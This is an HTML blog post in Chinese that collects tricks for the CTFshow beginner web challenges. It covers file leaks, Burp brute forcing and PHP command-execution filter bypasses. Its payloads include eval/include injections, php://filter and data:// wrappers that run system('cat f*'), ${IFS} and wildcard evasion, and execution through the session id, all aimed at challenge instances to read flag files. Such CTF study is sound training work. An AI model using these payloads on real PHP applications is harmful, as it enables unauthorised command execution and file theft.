@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="eFIczS6pLawspui5Sm7JUbsaANiKGnqjmDod70iSzI4" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="只记录一些tick，不是wp  PHP文档中使用的伪类型与变量  mixed –&gt; 说明一个参数可以接受多种不同的（但不一定是所有的）类型例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组 number –&gt; 说明一个参数可以是 integer 或者 float array|object –&gt; 意思是参数既可以是 array">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW WEB入门 Ttick总结">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="只记录一些tick，不是wp  PHP文档中使用的伪类型与变量  mixed –&gt; 说明一个参数可以接受多种不同的（但不一定是所有的）类型例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组 number –&gt; 说明一个参数可以是 integer 或者 float array|object –&gt; 意思是参数既可以是 array">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.xqklo38zuce.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201105182344281.png#pic_center">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.8i160rqgpag.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.e8x3axfwwan.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.oys89ez7sjb.png">
+<meta property="article:published_time" content="2020-11-01T10:01:49.000Z">
+<meta property="article:modified_time" content="2020-11-09T13:48:38.055Z">
+<meta property="article:author" content="yq1ng">
+<meta property="article:tag" content="...">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.png">
+
+<link rel="canonical" href="http://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTFSHOW WEB入门 Ttick总结 | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFSHOW WEB入门 Ttick总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-01 18:01:49" itemprop="dateCreated datePublished" datetime="2020-11-01T18:01:49+08:00">2020-11-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-09 21:48:38" itemprop="dateModified" datetime="2020-11-09T21:48:38+08:00">2020-11-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>20k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>34 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>只记录一些tick，不是wp</p>
+<blockquote>
+<p>PHP文档中使用的伪类型与变量</p>
+<ul>
+<li><code>mixed</code> –&gt; 说明一个参数可以接受多种不同的（但不一定是所有的）类型<br>例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组</li>
+<li><code>number</code> –&gt; 说明一个参数可以是 integer 或者 float</li>
+<li><code>array|object</code> –&gt; 意思是参数既可以是 array 也可以是 object</li>
+<li><code>void</code> –&gt; 作为返回类型意味着函数的返回值是无用的。void 作为参数列表意味着函数不接受任何参数。从 PHP 7.1 开始 void 接受一个函数为返回类型</li>
+<li><code>...</code> –&gt; 在函数原型中，<code>$...</code> 表示等等的意思。当一个函数可以接受任意个参数时使用此变量名</li>
+</ul>
+</blockquote>
+<!-- TOC -->
+
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">信息搜集</a><ul>
+<li><a href="#web5">web5</a></li>
+<li><a href="#web6">web6</a></li>
+<li><a href="#web14">web14</a></li>
+<li><a href="#web16">web16</a></li>
+<li><a href="#web19">web19</a></li>
+<li><a href="#web20">web20</a></li>
+</ul>
+</li>
+<li><a href="#%E7%88%86%E7%A0%B4">爆破</a><ul>
+<li><a href="#web21">web21</a></li>
+</ul>
+</li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Crce">命令执行（RCE）</a><ul>
+<li><a href="#web31">web31</a></li>
+<li><a href="#web32-36">web32-36</a></li>
+</ul>
+</li>
+<li><a href="#binsh">!/bin/sh</a></li>
+<li><a href="#encoding-utf-8">encoding: utf-8</a></li>
+<li><a href="#encoding-utf-8-1">encoding: utf-8</a></li>
+<li><a href="#encoding-utf-8-2">encoding: utf-8</a></li>
+<li><a href="#py2">py2</a></li>
+<li><a href="#encoding-utf-8-3">encoding: utf-8</a></li>
+<li><a href="#author--yq1ng">@Author:  yq1ng</a></li>
+<li><a href="#date----2020-11-09-1830">@Date:    2020-11-09 18:30</a></li>
+<li><a href="#---coding-utf-8---">-<em>- coding: utf-8 -</em>-</a></li>
+<li><a href="#author-h1xa">@Author: h1xa</a></li>
+<li><a href="#date---2020-11-07-050051">@Date:   2020-11-07 05:00:51</a></li>
+<li><a href="#last-modified-by---h1xa">@Last Modified by:   h1xa</a></li>
+<li><a href="#last-modified-time-2020-11-07-162853">@Last Modified time: 2020-11-07 16:28:53</a></li>
+<li><a href="#email-h1xactfercom">@email: h1xa@ctfer.com</a></li>
+<li><a href="#link-httpsctfercom">@link: https://ctfer.com</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>php文件泄露，访问<code>index.phps</code></p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>常见文件备份参见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/13598803.html">此博客</a></p>
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>泄露重要(editor)的信息 直接在url后面添加/editor</p>
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>payload:<code>/tz.php</code> –&gt; 雅黑PHP探针<br>PHP探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>前台输入密码浏览器转码了，抓包重放</p>
+<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag</p>
+<hr>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>bp爆破的custom iterator(自定义迭代器)应用<br>需要进行base64编码：payload processing 进行编码设置<br>取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果</p>
+<hr>
+<h1 id="命令执行（RCE）"><a href="#命令执行（RCE）" class="headerlink" title="命令执行（RCE）"></a>命令执行（RCE）</h1><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><code>if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c))</code><br>过滤空格：<code>%09</code>、<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>、<code>&lt;&gt;</code>、<code>&lt;</code><br>自己的payload：?c=echo(`tail%09f*`);<br>搜集的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"></span><br><span class="line">c=$a=show_source($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=flag.php</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=system(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`$_GET[<span class="number">1</span>]`;&amp;<span class="number">1</span>=cat flag.php<span class="comment">//查看源代码</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>passthru($_GET[<span class="number">1</span>]);&amp;<span class="number">1</span>=cat flag.php<span class="comment">//查看源代码</span></span><br></pre></td></tr></table></figure>
+<h2 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h2><figure class="highlight plain"><figcaption><span>|\'|\`|echo|\;|\(/i", $c))```\</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#96;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#96;</span><br><span class="line">## web37&#x2F;39</span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; </span><br><span class="line">    include($c); </span><br><span class="line">    echo $flag; </span><br><span class="line">&#125;</span><br><span class="line">if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; </span><br><span class="line">    include($c.&quot;.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</span><br><span class="line">&#x2F;&#x2F;39 output：$flag&#x3D;&quot;flag&#123;8262a004-69e7-460b-b412-05d4178c08f8&#125;&quot;;.php</span><br><span class="line">&#x2F;&#x2F;39 data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</span><br></pre></td></tr></table></figure>
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">    <span class="keyword">include</span>($c);</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//过滤了php和file</span></span><br><span class="line"><span class="comment">//?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">    <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题跟<a href="https://yq1ng.github.io/z_post/BUUOJ-[GXYCTF2019]-WEB-WP/#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">GXYCTF2019的禁止套娃</a>很像，参考一下<br>在看一个利用session的<del>题解</del><br><code>?c=session_start();system(session_id());</code><br>在session处添加一条记录：<code>PHPSESSID:ls</code>，可以列出文件，再改成<code>c=session_start();highlight_file(session_id());</code>，flag读不出来。。凉</p>
+<blockquote>
+<p>引自<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108415301">羽大佬博客</a><br>经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</p>
+</blockquote>
+<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">web41</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
+<p>exp已经保存了，哈哈</p>
+<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p><code>system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</code><br>详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ithomer/article/details/9288353">https://blog.csdn.net/ithomer/article/details/9288353</a></p>
+<blockquote>
+<p><code>/dev/null</code> ：代表空设备文件<br><code>&gt;</code>  ：代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br><code>1</code>  ：表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br><code>2</code>  ：表示stderr标准错误<br><code>&amp;</code>  ：表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1\</p>
+</blockquote>
+<p><code>1 &gt; /dev/null 2&gt;&amp;1 </code>语句含义：<br><code>1 &gt; /dev/null</code> ： 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br><code>2&gt;&amp;1</code> ：接着，标准错误输出重定向（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。<br>payload：<code>?c=cat flag*%0a</code>，<code>%0a</code>进行换行</p>
+<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))</span><br></pre></td></tr></table></figure>
+<p>往上payload：<code>?c=nl$&#123;IFS&#125;fla%27%27g.php%0a</code>通杀</p>
+<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))</span><br><span class="line">    system($c);</span><br></pre></td></tr></table></figure>
+<p>payload：<code>?c=/bin/?at$&#123;IFS&#125;f???????</code><br>cat什么的被过滤了就要从bin下再把它引出来</p>
+<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Lazzaro师傅真狠啊，字母全凉了，不过羽师傅提供了一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108555433">骚思路</a>，真是活久见。。\</p>
+<ol>
+<li><p>payload：<code>?c=/???/????64 ????.???</code> –&gt;  <code>/bin/base64 flag.php</code></p>
+</li>
+<li><p>通过该命令压缩flag.php 然后进行下载<br> payload：<code>?c=/???/???/????2 ????.???</code><br> 也就是<code>/usr/bin/bzip2 flag.php</code><br> 然后访问<code>/flag.php.bz2</code>进行下载获得<code>flag.php</code></p>
+<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))</span><br></pre></td></tr></table></figure>
+<p>和上题类似，过滤内容变了，这次数字也不能用了，附上<a href="leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P牛博客</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky师傅博客</a>还有<a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/1407.html">Y1ng师傅</a><br>linux中<code>.</code>相当于<code>source</code>可以执行sh命令，且无需执行权限，<a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">具体介绍点此</a>\</p>
+</li>
+<li><p>构造上传页面</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://45e8c3c6-fd54-4110-a17f-3dff9f3e68a2.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>抓包，构造poc命令执行<br>发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母，看一下ASCII表，可以发现大写字母在<code>@</code>和<code>[</code>之间，而Linux的glob通配符支持利用<code>[0-9]</code>来表示一个范围，那么就可以用<code>[@-[]</code>来表示大写字母<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.png" alt="ASCII"></p>
+</li>
+</ol>
